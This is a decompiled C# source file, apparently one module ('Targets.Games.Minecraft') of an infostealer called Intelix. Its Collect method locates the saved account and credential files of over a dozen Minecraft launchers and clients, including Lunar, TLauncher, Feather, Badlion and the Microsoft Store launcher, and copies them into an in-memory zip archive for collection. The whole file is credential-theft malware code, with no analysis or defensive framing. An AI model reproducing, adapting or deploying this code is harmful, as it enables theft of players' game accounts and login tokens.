using System;
using System.Collections.Generic;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x02000027 RID: 39
	public class Minecraft : ITarget
	{
		// Token: 0x06000071 RID: 113 RVA: 0x000051F8 File Offset: 0x000033F8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			Dictionary<string, string> dictionary = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
			dictionary.Add("Intent", Path.Combine(environmentVariable, "intentlauncher", "launcherconfig"));
			dictionary.Add("Lunar", Path.Combine(new string[]
			{
				environmentVariable,
				".lunarclient",
				"settings",
				"game",
				"accounts.json"
			}));
			dictionary.Add("TLauncher", Path.Combine(folderPath, ".minecraft", "TlauncherProfiles.json"));
			dictionary.Add("Feather", Path.Combine(folderPath, ".feather", "accounts.json"));
			dictionary.Add("Meteor", Path.Combine(folderPath, ".minecraft", "meteor-client", "accounts.nbt"));
			dictionary.Add("Impact", Path.Combine(folderPath, ".minecraft", "Impact", "alts.json"));
			dictionary.Add("Novoline", Path.Combine(folderPath, ".minecraft", "Novoline", "alts.novo"));
			dictionary.Add("CheatBreakers", Path.Combine(folderPath, ".minecraft", "cheatbreaker_accounts.json"));
			dictionary.Add("Microsoft Store", Path.Combine(folderPath, ".minecraft", "launcher_accounts_microsoft_store.json"));
			dictionary.Add("Rise", Path.Combine(folderPath, ".minecraft", "Rise", "alts.txt"));
			dictionary.Add("Rise (Intent)", Path.Combine(environmentVariable, "intentlauncher", "Rise", "alts.txt"));
			dictionary.Add("Paladium", Path.Combine(folderPath, "paladium-group", "accounts.json"));
			dictionary.Add("PolyMC", Path.Combine(folderPath, "PolyMC", "accounts.json"));
			dictionary.Add("Badlion", Path.Combine(folderPath, "Badlion Client", "accounts.json"));
			Counter.CounterApplications counterApplications = new Counter.CounterApplications
			{
				Name = "Minecraft"
			};
			foreach (KeyValuePair<string, string> keyValuePair in dictionary)
			{
				bool flag = File.Exists(keyValuePair.Value);
				if (flag)
				{
					try
					{
						string path = Path.Combine("Minecraft", keyValuePair.Key);
						string fileName = Path.GetFileName(keyValuePair.Value);
						string text = Path.Combine(path, fileName);
						zip.AddFile(text, File.ReadAllBytes(keyValuePair.Value));
						counterApplications.Files.Add(keyValuePair.Value + " => " + text);
					}
					catch
					{
					}
				}
			}
			bool flag2 = counterApplications.Files.Count > 0;
			if (flag2)
			{
				counterApplications.Files.Add("Minecraft\\");
				counter.Games.Add(counterApplications);
			}
		}
	}
}
